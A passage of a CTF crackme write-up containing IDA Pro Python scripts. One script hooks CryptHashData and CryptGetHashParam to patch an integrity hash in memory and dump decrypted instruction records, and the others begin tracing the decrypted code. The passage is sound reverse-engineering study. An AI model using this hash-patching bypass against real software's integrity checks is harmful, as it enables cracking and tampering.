class="params">ea</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        idc.add_bpt(ea)</span><br><span class="line">        idc.enable_bpt(ea, <span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception: <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ida_dbg.add_bpt(ea)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_dump_once</span>(<span class="params">tid=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">global</span> g_fp, g_last_dump16, g_dump_count</span><br><span class="line">    <span class="keyword">if</span> MAX_DUMPS <span class="keyword">and</span> g_dump_count &gt;= MAX_DUMPS: <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">try</span>: p = ida_dbg.get_reg_val(<span class="string">&quot;EBX&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[dump] get_reg_val(EBX) failed: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> p <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> p &lt; <span class="number">0x10000</span>: <span class="keyword">return</span></span><br><span class="line">    data = dbg_read_mem(p, READ_SIZE)</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[dump] failed to read <span class="subst">&#123;READ_SIZE&#125;</span> bytes @ EBX=0x<span class="subst">&#123;p:08X&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(data) &lt; READ_SIZE: data += <span class="string">b&quot;\x00&quot;</span> * (READ_SIZE - <span class="built_in">len</span>(data))</span><br><span class="line">    <span class="keyword">if</span> DEDUP_CONSECUTIVE <span class="keyword">and</span> g_last_dump16 == data: <span class="keyword">return</span></span><br><span class="line">    out = data + (<span class="string">b&quot;\x00&quot;</span> * PAD_SIZE)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        g_fp.write(out)</span><br><span class="line">        g_fp.flush()</span><br><span class="line">        g_last_dump16 = data</span><br><span class="line">        g_dump_count += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[dump] #<span class="subst">&#123;g_dump_count&#125;</span> hit 0x<span class="subst">&#123;BREAK_EA:08X&#125;</span> | EBX=0x<span class="subst">&#123;p:08X&#125;</span> | wrote <span class="subst">&#123;<span class="built_in">len</span>(out)&#125;</span> bytes&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[dump] file write error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_maybe_patch_hash</span>():</span><br><span class="line">    esp = ida_dbg.get_reg_val(<span class="string">&quot;ESP&quot;</span>)</span><br><span class="line">    hHash   = dbg_read_u32(esp + <span class="number">4</span>)</span><br><span class="line">    dwParam = dbg_read_u32(esp + <span class="number">8</span>)</span><br><span class="line">    pbOut   = dbg_read_u32(esp + <span class="number">0xC</span>)</span><br><span class="line">    pdwLen  = dbg_read_u32(esp + <span class="number">0x10</span>)</span><br><span class="line">    <span class="keyword">if</span> dwParam != HP_HASHVAL: <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> (hHash <span class="keyword">in</span> g_hash_seen_text) <span class="keyword">and</span> (pbOut == PATCH_DST):</span><br><span class="line">        ok1 = dbg_write_mem(PATCH_DST, PATCH_BYTES)</span><br><span class="line">        ok2 = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> pdwLen: ok2 = dbg_write_u32(pdwLen, <span class="number">0x20</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[patch] hHash=0x<span class="subst">&#123;hHash:08X&#125;</span> patched @0x<span class="subst">&#123;PATCH_DST:08X&#125;</span> bytes_ok=<span class="subst">&#123;ok1&#125;</span> len_ok=<span class="subst">&#123;ok2&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MixHooks</span>(ida_dbg.DBG_Hooks):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, crypt_hashdata_ea, crypt_gethashparam_ret_ea</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        <span class="variable language_">self</span>.crypt_hashdata_ea = crypt_hashdata_ea</span><br><span class="line">        <span class="variable language_">self</span>.crypt_gethashparam_ret_ea = crypt_gethashparam_ret_ea</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dbg_bpt</span>(<span class="params">self, tid, ea</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> ea == <span class="variable language_">self</span>.crypt_hashdata_ea:</span><br><span class="line">                esp = ida_dbg.get_reg_val(<span class="string">&quot;ESP&quot;</span>)</span><br><span class="line">                hHash  = dbg_read_u32(esp + <span class="number">4</span>)</span><br><span class="line">                pbData = dbg_read_u32(esp + <span class="number">8</span>)</span><br><span class="line">                cbData = dbg_read_u32(esp + <span class="number">0xC</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> is_in_text(pbData, cbData):</span><br><span class="line">                    g_hash_seen_text.add(hHash)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[hash] tid=<span class="subst">&#123;tid&#125;</span> hHash=0x<span class="subst">&#123;hHash:08X&#125;</span> HASHED_TEXT pb=0x<span class="subst">&#123;pbData:08X&#125;</span> len=0x<span class="subst">&#123;cbData:X&#125;</span>&quot;</span>)</span><br><span class="line">                _execute_sync(_<span class="keyword">continue</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span> ea == <span class="variable language_">self</span>.crypt_gethashparam_ret_ea:</span><br><span class="line">                _maybe_patch_hash()</span><br><span class="line">                _execute_sync(_<span class="keyword">continue</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span> ea == BREAK_EA:</span><br><span class="line">                _dump_once(tid=tid)</span><br><span class="line">                <span class="keyword">if</span> MAX_DUMPS <span class="keyword">and</span> g_dump_count &gt;= MAX_DUMPS:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[dump] reached MAX_DUMPS=<span class="subst">&#123;MAX_DUMPS&#125;</span>, stopping hooks.&quot;</span>)</span><br><span class="line">                    stop()</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">                _execute_sync(_<span class="keyword">continue</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[mix] dbg_bpt exception: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">try</span>: _execute_sync(_<span class="keyword">continue</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception: <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dbg_process_exit</span>(<span class="params">self, pid, tid, ea, exit_code</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[mix] process exit (code=<span class="subst">&#123;exit_code&#125;</span>), stopping.&quot;</span>)</span><br><span class="line">        <span class="keyword">try</span>: stop()</span><br><span class="line">        <span class="keyword">except</span> Exception: <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">global</span> g_hooks, g_fp, g_hash_seen_text, g_last_dump16, g_dump_count</span><br><span class="line">    <span class="keyword">if</span> g_hooks <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[mix] already started&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    g_hash_seen_text = <span class="built_in">set</span>()</span><br><span class="line">    g_last_dump16 = <span class="literal">None</span></span><br><span class="line">    g_dump_count = <span class="number">0</span></span><br><span class="line">    os.makedirs(os.path.dirname(OUTPUT_PATH), exist_ok=<span class="literal">True</span>)</span><br><span class="line">    g_fp = <span class="built_in">open</span>(OUTPUT_PATH, <span class="string">&quot;ab&quot;</span> <span class="keyword">if</span> APPEND_OUTPUT <span class="keyword">else</span> <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">    crypt_hashdata_ea = resolve_ea_by_names(CRYPT_HASHDATA_NAME_CANDIDATES)</span><br><span class="line">    <span class="keyword">if</span> crypt_hashdata_ea <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[mix] ERROR: cannot resolve cryptsp_CryptHashData by name.&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[mix] Please rename that function in IDA or hardcode its EA in the script.&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    cryptsp_base = find_module_base(<span class="string">&quot;cryptsp&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> cryptsp_base: crypt_gethashparam_ret_ea = cryptsp_base + <span class="number">0x50D2</span></span><br><span class="line">    <span class="keyword">else</span>: crypt_gethashparam_ret_ea = CRYPTSP_GHP_RET_EA_ABS</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> add_bpt(BREAK_EA):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[mix] ERROR: add_bpt failed @ 0x<span class="subst">&#123;BREAK_EA:08X&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> add_bpt(crypt_hashdata_ea):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[mix] ERROR: add_bpt failed @ 0x<span class="subst">&#123;crypt_hashdata_ea:08X&#125;</span> (CryptHashData)&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> add_bpt(crypt_gethashparam_ret_ea):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[mix] ERROR: add_bpt failed @ 0x<span class="subst">&#123;crypt_gethashparam_ret_ea:08X&#125;</span> (GetHashParam RET)&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    g_hooks = MixHooks(crypt_hashdata_ea, crypt_gethashparam_ret_ea)</span><br><span class="line">    g_hooks.hook()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[mix] started.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  BREAK_EA                 = 0x<span class="subst">&#123;BREAK_EA:08X&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  CryptHashData EA         = 0x<span class="subst">&#123;crypt_hashdata_ea:08X&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  GetHashParam RET EA      = 0x<span class="subst">&#123;crypt_gethashparam_ret_ea:08X&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  TEXT                     = 0x<span class="subst">&#123;TEXT_BASE:08X&#125;</span>..0x<span class="subst">&#123;(TEXT_BASE+TEXT_LEN):08X&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  PATCH_DST                = 0x<span class="subst">&#123;PATCH_DST:08X&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  OUTPUT                   = <span class="subst">&#123;OUTPUT_PATH&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  DEDUP_CONSECUTIVE        = <span class="subst">&#123;DEDUP_CONSECUTIVE&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  MAX_DUMPS                = <span class="subst">&#123;MAX_DUMPS <span class="keyword">or</span> <span class="string">&#x27;unlimited&#x27;</span>&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stop</span>():</span><br><span class="line">    <span class="keyword">global</span> g_hooks, g_fp</span><br><span class="line">    <span class="keyword">if</span> g_hooks <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">try</span>: g_hooks.unhook()</span><br><span class="line">        <span class="keyword">except</span> Exception: <span class="keyword">pass</span></span><br><span class="line">        g_hooks = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">try</span>: idc.enable_bpt(BREAK_EA, <span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception: <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">if</span> g_fp <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            g_fp.flush()</span><br><span class="line">            g_fp.close()</span><br><span class="line">        <span class="keyword">except</span> Exception: <span class="keyword">pass</span></span><br><span class="line">        g_fp = <span class="literal">None</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[mix] stopped.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    start()</span><br></pre></td></tr></table></figure>

<p>Set hardware breakpoint at 0x19F38C, and the shellcode firstly calls strlen and cmp the length with 19. However, setting hardware breakpoints can also cause subsequent instructions to malfunction after triggering the breakpoint. Parse dump.bin (not that if the operator is call, it will not appears at the first line of a block):</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> ida_segment</span><br><span class="line"><span class="keyword">import</span> ida_bytes</span><br><span class="line"><span class="keyword">import</span> ida_ua</span><br><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"></span><br><span class="line">RECORD_SIZE   = <span class="number">0x20</span></span><br><span class="line">VALID_PREFIX  = <span class="number">0x10</span></span><br><span class="line">OUT_ASMCODE   = <span class="string">r&quot;E:\CTF\temp\asmcode.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">to_pat_hex</span>(<span class="params">bs: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">str</span>: <span class="keyword">return</span> bs.<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    seg = ida_segment.getseg(<span class="number">0</span>)</span><br><span class="line">    start, end = seg.start_ea, seg.end_ea</span><br><span class="line">    nrec = (end - start) // RECORD_SIZE</span><br><span class="line">    os.makedirs(os.path.dirname(OUT_ASMCODE), exist_ok=<span class="literal">True</span>)</span><br><span class="line">    out_lines = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nrec):</span><br><span class="line">        ea = start + i * RECORD_SIZE</span><br><span class="line">        ida_bytes.del_items(ea, ida_bytes.DELIT_SIMPLE, VALID_PREFIX)</span><br><span class="line">        insn1 = ida_ua.insn_t()</span><br><span class="line">        ilen1 = ida_ua.decode_insn(insn1, ea)</span><br><span class="line">        <span class="keyword">if</span> ilen1 &lt;= <span class="number">0</span> <span class="keyword">or</span> ilen1 &gt; VALID_PREFIX: <span class="keyword">continue</span></span><br><span class="line">        bytes1 = ida_bytes.get_bytes(ea, ilen1)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> bytes1: <span class="keyword">continue</span></span><br><span class="line">        out_lines.append(to_pat_hex(bytes1))</span><br><span class="line">        ea2 = ea + ilen1</span><br><span class="line">        <span class="keyword">if</span> ea2 &lt; ea + VALID_PREFIX:</span><br><span class="line">            insn2 = ida_ua.insn_t()</span><br><span class="line">            ilen2 = ida_ua.decode_insn(insn2, ea2)</span><br><span class="line">            <span class="keyword">if</span> ilen2 &gt; <span class="number">0</span> <span class="keyword">and</span> insn2.itype == idaapi.NN_call:</span><br><span class="line">                bytes2 = ida_bytes.get_bytes(ea2, ilen2)</span><br><span class="line">                <span class="keyword">if</span> bytes2: out_lines.append(to_pat_hex(bytes2))  </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(OUT_ASMCODE, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f: </span><br><span class="line">        <span class="keyword">for</span> s <span class="keyword">in</span> out_lines: f.write(s + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[ok] wrote <span class="subst">&#123;<span class="built_in">len</span>(out_lines)&#125;</span> lines -&gt; <span class="subst">&#123;OUT_ASMCODE&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>And then patch decrypted .pc to another Crackme.exe, get the disasm:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> ida_bytes</span><br><span class="line"><span class="keyword">import</span> ida_segment</span><br><span class="line"><span class="keyword">import</span> ida_ua</span><br><span class="line"></span><br><span class="line">ASMCODE_PATH = <span class="string">r&quot;E:\CTF\temp\asmcode.txt&quot;</span></span><br><span class="line">OUT_TRACEASM = <span class="string">r&quot;E:\CTF\temp\traceasm.txt&quot;</span></span><br><span class="line">PC_START_EA  = <span class="number">0x0040A000</span></span><br><span class="line">WINDOW       = <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hex_to_bytes</span>(<span class="params">hx: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    hx = hx.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(hx) % <span class="number">2</span> != <span class="number">0</span>: <span class="keyword">raise</span> ValueError(<span class="string">f&quot;bad hex len: <span class="subst">&#123;hx&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>.fromhex(hx)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bytes_to_patstr</span>(<span class="params">bs: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">str</span>: <span class="keyword">return</span> <span class="string">&quot; &quot;</span>.join(<span class="string">f&quot;<span class="subst">&#123;b:02x&#125;</span>&quot;</span> <span class="keyword">for</span> b <span class="keyword">in</span> bs)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_pc_seg</span>():</span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> (<span class="string">&quot;.pc&quot;</span>, <span class="string">&quot;pc&quot;</span>):</span><br><span class="line">        seg = ida_segment.get_segm_by_name(name)</span><br><span class="line">        <span class="keyword">if</span> seg: <span class="keyword">return</span> seg</span><br><span class="line">    <span class="keyword">return</span> ida_segment.getseg(PC_START_EA)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_bytes</span>(<span class="params">ea: <span class="built_in">int</span>, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="literal">None</span>:</span><br><span class="line">    bs = ida_bytes.get_bytes(ea, n)</span><br><span class="line">    <span class="keyword">return</span> bs <span class="keyword">if</span> bs <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">pc_blob = <span class="number">0</span></span><br><span class="line">seg_start = <span class="number">0</span></span><br><span class="line">seg_end = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_in_range</span>(<span class="params">start_ea: <span class="built_in">int</span>, end_ea: <span class="built_in">int</span>, needle: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">global</span> pc_blob, seg_start, seg_end</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> pc_blob:</span><br><span class="line">        <span class="keyword">return</span> idc.BADADDR</span><br><span class="line">    s = <span class="built_in">max</span>(start_ea, seg_start) - seg_start</span><br><span class="line">    e = <span class="built_in">min</span>(end_ea,   seg_end)   - seg_start</span><br><span class="line">    <span class="keyword">if</span> s &lt; <span class="number">0</span>: s = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> e &lt; s: <span class="keyword">return</span> idc.BADADDR</span><br><span class="line">    idx = pc_blob.find(needle, s, e)</span><br><span class="line">    <span class="keyword">return</span> (seg_start + idx) <span class="keyword">if</span> idx != -<span class="number">1</span> <span class="keyword">else</span> idc.BADADDR</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_len_and_mnem</span>(<span class="params">ea: <span class="built_in">int</span>, fallback_len: <span class="built_in">int</span></span>):</span><br><span class="line">    idc.create_insn(ea)</span><br><span class="line">    insn = ida_ua.insn_t()</span><br><span class="line">    ilen = ida_ua.decode_insn(insn, ea)</span><br><span class="line">    <span class="keyword">if</span> ilen &lt;= <span class="number">0</span>: ilen = fallback_len</span><br><span class="line">    mnem = (idc.print_insn_mnem(ea) <span class="keyword">or</span> <span class="string">&quot;&quot;</span>).lower()</span><br><span class="line">    <span class="keyword">return</span> ilen, mnem</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">op_target</span>(<span class="params">ea: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        v = idc.get_operand_value(ea, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> v <span class="keyword">if</span> <span class="built_in">isinstance</span>(v, <span class="built_in">int</span>) <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_ret</span>(<span class="params">mnem: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>: <span class="keyword">return</span> mnem.startswith(<span class="string">&quot;ret&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_call</span>(<span class="params">mnem: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>: <span class="keyword">return</span> mnem == <span class="string">&quot;call&quot;</span> <span class="keyword">or</span> mnem == <span class="string">&quot;callf&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_jmp</span>(<span class="params">mnem: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>: <span class="keyword">return</span> mnem == <span class="string">&quot;jmp&quot;</span> <span class="keyword">or</span> mnem == <span class="string">&quot;jmpf&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_cond_jump_or_loop</span>(<span class="params">mnem: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="keyword">if</span> mnem <span class="keyword">in</span> (<span class="string">&quot;jcxz&quot;</span>, <span class="string">&quot;jecxz&quot;</span>, <span class="string">&quot;loop&quot;</span>, <span class="string">&quot;loope&quot;</span>, <span class="string">&quot;loopz&quot;</span>, <span class="string">&quot;loopne&quot;</span>, <span class="string">&quot;loopnz&quot;</span>): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> mnem.startswith(<span class="string">&quot;j&quot;</span>) <span class="keyword">and</span> <span class="keyword">not</span> is_jmp(mnem)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">global</span> pc_blob, seg_start, seg_end</span><br><span class="line">    seg = get_pc_seg()</span><br><span class="line">    seg_start, seg_end = seg.start_ea, seg.end_ea</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (seg_start &lt;= PC_START_EA &lt; seg_end): <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;PC_START_EA=0x<span class="subst">&#123;PC_START_EA:08X&#125;</span> not in 0x<span class="subst">&#123;seg_start:08X&#125;</span>-0x<span class="subst">&#123;seg_end:08X&#125;</span>&quot;</span>)</span><br><span class="line">    pc_blob = 